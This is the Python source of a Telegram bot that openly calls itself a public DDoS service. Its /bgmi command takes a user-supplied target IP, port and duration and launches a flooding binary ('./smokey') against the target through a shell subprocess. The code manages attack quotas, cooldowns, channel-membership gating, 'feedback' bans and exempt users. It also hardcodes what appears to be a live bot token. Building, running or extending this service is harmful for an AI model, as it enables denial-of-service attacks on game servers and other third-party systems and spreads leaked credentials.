import os
import telebot
import asyncio
import random
import time
import logging
from threading import Thread
from datetime import datetime, timedelta, timezone

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '7315607724:AAEm4UPL-RnDwHM9pxqqHRB8SXcUtB36VbA' 
CHANNEL_ID = '-1002352302807'
required_channel = '@TOPTEN_CHEAT'  # Replace with your actual channel username

bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time

# Dictionary to store end times of ongoing attacks
ongoing_attacks = {}

COOLDOWN_DURATION = 300  # Cooldown duration in seconds
BAN_DURATION = timedelta(minutes=15)
DAILY_ATTACK_LIMIT = 5  # Daily attack limit per user

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002]  # Blocked ports list

EXEMPTED_USERS = [6768273586, 1431950109, 6111808288, 1340584902, 5317827318, 7082215587, 2007860433, 7017469802, 1056173503]

# Initialize reset_time at midnight IST of the current day
def initialize_reset_time():
    """Initialize reset_time to midnight IST of the current day."""
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    return ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

# Global variable to track the next reset time
reset_time = initialize_reset_time()

def reset_daily_counts():
    """Reset the daily attack counts and other data at midnight IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    # Check if it's time to reset
    if ist_now >= reset_time:
        # Clear all daily data
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        # Set the next reset time to midnight IST of the next day
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
        logging.info(f"Next reset scheduled at: {reset_time}")

# Semaphore to limit concurrent attacks to two
attack_semaphore = asyncio.Semaphore(2)

# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# Function to run each attack in a separate thread with semaphore control
def run_attack_thread(chat_id, ip, port, duration):
    asyncio.run(run_attack(chat_id, ip, port, duration))

async def run_attack(chat_id, ip, port, duration):
    async with attack_semaphore:  # Ensure only two attacks run concurrently
        try:
            # Run the shell command asynchronously
            process = await asyncio.create_subprocess_shell(
                f"./smokey {ip} {port} {duration} 1200",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # Wait for the process to complete and capture output
            stdout, stderr = await process.communicate()
            
            # Log stdout and stderr if available
            if stdout:
                print(f"[stdout]\n{stdout.decode()}")
            if stderr:
                print(f"[stderr]\n{stderr.decode()}")
            
            # Notify the user that the attack has finished
            bot.send_message(
                chat_id,
                f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 @TOPTEN_CHEAT™"
            )
        except Exception as e:
            # Send an error message to the user in case of failure
            bot.send_message(
                chat_id,
                f"*{str(e)}*",
                parse_mode='Markdown'
            )


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    bot.send_message(
            message.chat.id,
            f"👋🏻  Welcome {user_name}.\n\n"
            f"[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/TOPTEN_CHEATS)\n\n"    
            f"*Try To Run This Command : /bgmi*",
    parse_mode="Markdown",
    disable_web_page_preview=True  # This disables the link preview
    )
    bot.send_message(
            message.chat.id,
            f"➤    [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/MrinMoYxCB)   ᯓᡣ𐭩\n\n",
    parse_mode="Markdown",
    disable_web_page_preview=True  # This disables the link preview
    )

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure default values for user data
    if user_id not in user_attacks:
        user_attacks[user_id] = 0
    if user_id not in user_cooldowns:
        user_cooldowns[user_id] = None
    if user_id not in user_photos:
        user_photos[user_id] = False
    if user_id not in user_bans:
        user_bans[user_id] = None

    # Check if the user is a member of the required channel
    try:
        user_status = bot.get_chat_member(required_channel, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            bot.send_message(
                message.chat.id,
                f"🚨𝗛𝗜 👋 {message.from_user.first_name}, \n\n‼️ *𝙏𝙊𝙋𝙏𝙀𝙉 𝙋𝙐𝘽𝙇𝙞𝘾 𝘿𝘿𝙊𝙎 𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 !* ‼️\n\n"
                f"            [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/TOPTEN_CHEAT)\n\n"
                "🔒 *𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗮𝗻𝗱 𝗯𝗲𝗰𝗼𝗺𝗲 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿 𝗼𝗳 𝗼𝘂𝗿 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗵𝗲𝗿𝗲!* 🔒\n\n",
                parse_mode="Markdown",
                disable_web_page_preview=True,
            )
            bot.send_message(
                message.chat.id,
                f"‼️ *𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /𝗯𝗴𝗺𝗶 𝗮𝗴𝗮𝗶𝗻* ‼️",
                parse_mode="Markdown",
            )
            return

    except Exception as e:
        bot.send_message(message.chat.id,
                         f"{str(e)}")
        return

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id,
                         "⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️\n\n➤    [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/MrinMoYxCB)   ᯓᡣ𐭩\n\n", parse_mode="Markdown", disable_web_page_preview=True)
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if two attacks are currently running
    if attack_semaphore._value == 0:  # Semaphore is fully utilized
        bot.send_message(
            message.chat.id,
            f"‼️  *𝟮 / 𝟮 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗮𝗿𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗽𝗿𝗼𝗰𝗲𝗲𝗱𝗶𝗻𝗴.... 𝗞𝗶𝗻𝗱𝗹𝘆 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝗮𝗻𝘆 𝗼𝗻𝗲 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵* ‼️"
        , parse_mode="Markdown")
        return
        
    # Calculate remaining attacks for the user
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)

    # Check if the user is banned
    if user_bans[user_id]:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙆𝙞𝙣𝙙𝙡𝙮 𝙎𝙚𝙣𝙙 𝙖 𝙥𝙝𝙤𝙩𝙤 𝙖𝙣𝙙 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            user_bans[user_id] = None  # Remove ban after expiry

    # Check cooldowns for non-exempt users
    if user_id not in EXEMPTED_USERS:
        if user_cooldowns[user_id]:  # Ensure cooldown exists before checking time
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                minutes, seconds = divmod(remaining_time, 60)
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️"
                )
                return

    # Check attack limits for non-exempt users
    if remaining_attacks <= 0:
        bot.send_message(
            message.chat.id,
            f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
        )
        return

    # Check feedback requirement for non-exempt users
    if user_attacks.get(user_id, 0) > 0 and not user_photos.get(user_id):
        if not user_bans[user_id]:  # Only ban if not already banned
            user_bans[user_id] = datetime.now() + BAN_DURATION
        bot.send_message(
            message.chat.id,
            f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝟭𝟱 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
        )
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("𝙏𝙊𝙋𝙏𝙀𝙉 𝙋𝙐𝘽𝙇𝙞𝘾 𝘿𝘿𝙊𝙎 𝘼𝘾𝙏𝙄𝙑𝙀 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        
        ip, port, duration = args

        # Validate inputs
        if not is_valid_ip(ip):
            raise ValueError("❌ Invalid IP address. ❌")
        if not is_valid_port(port):
            raise ValueError("❌ Invalid port number. ❌")
        if not is_valid_duration(duration):
            raise ValueError("❌ Invalid duration. ❌")

        port = int(port)
        if port in blocked_ports:
            bot.send_message(message.chat.id,
                              f"‼️ 𝙋𝙤𝙧𝙩 {port} 𝙞𝙨 𝙗𝙡𝙤𝙘𝙠𝙚𝙙 ‼️ , 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙖 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙥𝙤𝙧𝙩 ✅")
            return

        # Override duration to fixed value (120 seconds)
        default_duration = 120
        user_duration = int(duration)

        # Increment attack count for non-exempt users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id)

        # Set cooldown for non-exempt users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

            
        # Notify the attack has started
        bot.send_message(
            message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n[ 𝙍𝙚𝙦𝙪𝙚𝙨𝙩𝙚𝙙 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣 : {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ]\n\n𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔 = {remaining_attacks} \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Run the attack asynchronously in a separate thread
        Thread(target=run_attack_thread,
               args=(message.chat.id, ip, port, default_duration)).start()

    except Exception as e:
        bot.send_message(message.chat.id,
                         f"{str(e)}")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    """Handles photo feedback from users."""
    global user_photos
    user_id = message.from_user.id
    user_photos[user_id] = True
    bot.send_message(
        message.chat.id,
        f"*𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 ✅ , {message.from_user.first_name} !  𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗼𝘁 .*",
    parse_mode="Markdown",
    )

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
